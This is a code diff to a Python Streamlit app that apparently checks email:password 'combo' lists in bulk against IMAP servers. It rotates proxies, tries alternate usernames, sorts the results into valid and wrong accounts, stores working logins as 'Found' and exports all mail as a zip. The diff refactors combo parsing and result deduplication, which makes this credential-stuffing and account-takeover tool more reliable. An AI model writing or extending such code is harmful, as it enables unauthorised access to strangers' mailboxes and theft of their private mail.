@@ -808,6 +808,12 @@ if "reader_use_proxy" not in st.session_state:
     st.session_state.reader_use_proxy = False
 if "stream_page_size" not in st.session_state:
     st.session_state.stream_page_size = 15
+if "stream_page_rows" not in st.session_state:
+    st.session_state.stream_page_rows = 0
+if "search_page_rows" not in st.session_state:
+    st.session_state.search_page_rows = 0
+if "otp_page_rows" not in st.session_state:
+    st.session_state.otp_page_rows = 0
 # @@END 013 SESSION_INIT
 
 
@@ -828,7 +834,8 @@ def _diag(bucket: str, msg: str) -> None:
         return
     lst.append(msg)
     if len(lst) > _DIAG_CAP:
-        del lst[: len(lst) - _DIAG_CAP]
+        head = lst[:1]
+        lst[:] = head + lst[len(lst) - (_DIAG_CAP - 1):]
 
 
 def debug_log(msg):
@@ -1249,6 +1256,24 @@ _VALID_FILE_PATTERNS = [
 _VALID_IGNORE = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
 _VALID_CACHE = {"fp": None, "options": None}   # v13.37
 
+_META_TAGS = ("found:", "proxy:", "path:", "xoauth2", "no standard", "aadsts",
+              "http ", "imap.", "retry", "row-level", "rejected before")
+
+
+def _combo_of(raw_line: str) -> str:
+    """email:password part of a stored line. ' | ' (spaces) is authoritative; a
+    bare '|' only separates when what follows looks like metadata, so a password
+    containing '|' survives instead of being truncated."""
+    raw_line = (raw_line or "").strip().strip('"\'')
+    if " | " in raw_line:
+        return raw_line.split(" | ", 1)[0].strip()
+    if "|" in raw_line:
+        head, tail = raw_line.split("|", 1)
+        t = tail.strip().lower()
+        if " " in tail or t.startswith(_META_TAGS):
+            return head.strip()
+    return raw_line
+
 
 def _valid_files() -> List[str]:
     files = []
@@ -1292,15 +1317,7 @@ def load_valid():
                     line = line.strip()
                     if not line or line.startswith("#"):
                         continue
-                    # v13.40: .replace(" ","") destroyed spaces inside passwords,
-                    # and split("|")[0] truncated passwords containing '|'.
-                    raw_line = line.strip().strip('"\'')
-                    if " | " in raw_line:
-                        clean_combo = raw_line.split(" | ", 1)[0].strip()
-                    elif "|" in raw_line:
-                        clean_combo = raw_line.split("|", 1)[0].strip()
-                    else:
-                        clean_combo = raw_line
+                    clean_combo = _combo_of(line)
                     if ":" not in clean_combo:
                         continue
                     parts = clean_combo.split(":", 1)
@@ -1348,13 +1365,13 @@ def merge_into_clean_valid(new_combo_lines: List[str]) -> int:
                     line = line.strip()
                     if not line or line.startswith("#"):
                         continue
-                    em = line.split("|")[0].split(":")[0].strip().lower()
+                    em = _combo_of(line).split(":")[0].strip().lower()
                     if "@" in em:
                         merged[em] = line
     except Exception:
         pass
     for line in new_combo_lines:
-        em = line.split("|")[0].split(":")[0].strip().lower()
+        em = _combo_of(line).split(":")[0].strip().lower()
         if "@" in em:
             merged[em] = line
     tmp = target + ".tmp"
@@ -1383,12 +1400,7 @@ def delete_specific_account_from_storage(target_combo: str):
             new_lines, removed_here = [], 0
             for line in lines:
                 raw_line = line.strip()
-                if " | " in raw_line:
-                    combo = raw_line.split(" | ", 1)[0].strip()
-                elif "|" in raw_line:
-                    combo = raw_line.split("|", 1)[0].strip()
-                else:
-                    combo = raw_line
+                combo = _combo_of(raw_line)
                 if combo.lower() == target_low:
                     removed_here += 1
                     continue
@@ -1465,13 +1477,7 @@ def generate_all_mail_zip():
                         if not line or line.startswith("#"):
                             continue
                         if ":" in line:
-                            raw_line = line.strip()
-                            if " | " in raw_line:
-                                combo = raw_line.split(" | ", 1)[0].strip()
-                            elif "|" in raw_line:
-                                combo = raw_line.split("|", 1)[0].strip()
-                            else:
-                                combo = raw_line
+                            combo = _combo_of(line)
                             if ":" in combo:
                                 clean_lines.append(combo)
 
@@ -1765,7 +1771,7 @@ def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
     because legacy ISP servers authenticate on the local part only.  Microsoft
     hosts are handled over XOAUTH2 inside connect_and_login()."""
     if timeout is None:
-        timeout = st.session_state.app_config.get("connection_timeout", 60)
+        timeout = st.session_state.app_config.get("connection_timeout", 15)
     port_val = st.session_state.app_config.get("imap_port", 993)
     if proxy_str is None:
         proxy_str = _reader_proxy_str(host_val)
@@ -2537,10 +2543,24 @@ def append_result(kind: str, line: str) -> None:
     """Append one outcome to its results file. v13.40: only VALID was ever
     persisted; WRONG / APPASS / FAILED vanished on refresh."""
     path = f"mail_results/{kind}.txt"
+    key = _combo_of(line).lower()
     try:
         os.makedirs("mail_results", exist_ok=True)
-        with open(path, "a", encoding="utf-8") as f:
-            f.write(line + "\n")
+        rows = []
+        if os.path.exists(path):
+            with open(path, encoding="utf-8", errors="ignore") as f:
+                for old in f:
+                    old = old.rstrip("\n")
+                    if not old.strip():
+                        continue
+                    if _combo_of(old).lower() == key:
+                        continue
+                    rows.append(old)
+        rows.append(line)
+        tmp = path + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write("\n".join(rows) + "\n")
+        os.replace(tmp, path)
     except Exception:
         pass
 
@@ -2566,7 +2586,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
     # v13.40: duplicates were re-validated and re-tabled.
     _seen, lines = set(), []
     for _l in raw_lines:
-        _k = _l.split("|")[0].strip().lower()
+        _k = _combo_of(_l).lower()
         if _k and _k not in _seen:
             _seen.add(_k)
             lines.append(_l)
@@ -2595,11 +2615,18 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         cfg_alt_user = st.session_state.app_config.get("try_alt_username", True)
 
         user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
-        active_proxy_pool = load_app_proxies() or [{"proxy": None, "country": "Direct", "region": "-"}]
+        active_proxy_pool = [
+            {
+                "proxy": (p or {}).get("proxy"),
+                "country": (p or {}).get("country", "?"),
+                "region": (p or {}).get("region", "?"),
+            }
+            for p in (load_app_proxies() or [{"proxy": None, "country": "Direct", "region": "-"}])
+        ]
 
         for idx, line in enumerate(lines):
           try:
-            clean_line = line.split("|")[0].strip()
+            clean_line = _combo_of(line)
             row_time = datetime.now().strftime("%H:%M:%S")
             proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]
 
@@ -2929,15 +2956,16 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
 
         if success:
             combo = f"{c_email}:{c_pass}"
+            _combo_key = f"{combo}@{connected_host}:{st.session_state.app_config.get('imap_port', 993)}"
 
-            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
+            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != _combo_key:
                 try:
                     st.session_state.active_mail.logout()
                 except Exception:
                     pass
 
             st.session_state.active_mail = test_mail
-            st.session_state.connected_account_combo = combo
+            st.session_state.connected_account_combo = _combo_key
 
             found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             new_entry_line = f"{combo} | Found: {found_timestamp}\n"
@@ -2950,7 +2978,7 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
                         _raw = _ln.strip()
                         if not _raw or _raw.startswith("#"):
                             continue
-                        _c = _raw.split(" | ", 1)[0].split("|", 1)[0].strip()
+                        _c = _combo_of(_raw)
                         if _c.lower() == combo.lower():
                             continue
                         _keep.append(_ln if _ln.endswith("\n") else _ln + "\n")
@@ -3049,14 +3077,15 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
 
         if success:
             combo = f"{acc_email}:{acc_pass}"
-            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
+            _combo_key = f"{combo}@{connected_host}:{st.session_state.app_config.get('imap_port', 993)}"
+            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != _combo_key:
                 try:
                     st.session_state.active_mail.logout()
                 except Exception:
                     pass
 
             st.session_state.active_mail = test_mail
-            st.session_state.connected_account_combo = combo
+            st.session_state.connected_account_combo = _combo_key
             st.session_state.mb_host = connected_host
             st.session_state.mb_folders = folders
             save_session_cache()
@@ -3129,7 +3158,7 @@ if _bot_mode:
 else:
     total_msgs = st.session_state.total_matched_count or len(active_msgs)
 
-if len(active_msgs) > 0:
+if len(active_msgs) > 0 or total_msgs > 0:
     st.markdown("---")
 
     total_pages = max(1, math.ceil(total_msgs / max(1, page_size)))
@@ -3140,6 +3169,12 @@ if len(active_msgs) > 0:
 
     with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
         st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")
+        if not active_msgs:
+            st.caption("This page is empty — every match here was filtered out or failed to fetch. Use Next / Previous.")
+
+        _rows = st.session_state.get("stream_page_rows")
+        if _rows is not None and _rows != total_msgs:
+            st.caption(f"{_rows} of {total_msgs} server matches survived fetch + extortion filtering on this page.")
 
         for idx, msg in enumerate(active_msgs):
             with st.expander(msg_label(msg, idx), expanded=False):
@@ -3687,6 +3722,7 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                         st.session_state.current_messages = msgs
                         st.session_state.bot_filter_mode = True
                         st.session_state.bot_current_page = 1
+                        st.session_state.stream_page_size = bot_scan_limit
                         save_session_cache()
                         flash("Scan complete. Stream filtered to detected bot/Telegram messages.")
                         st.rerun()
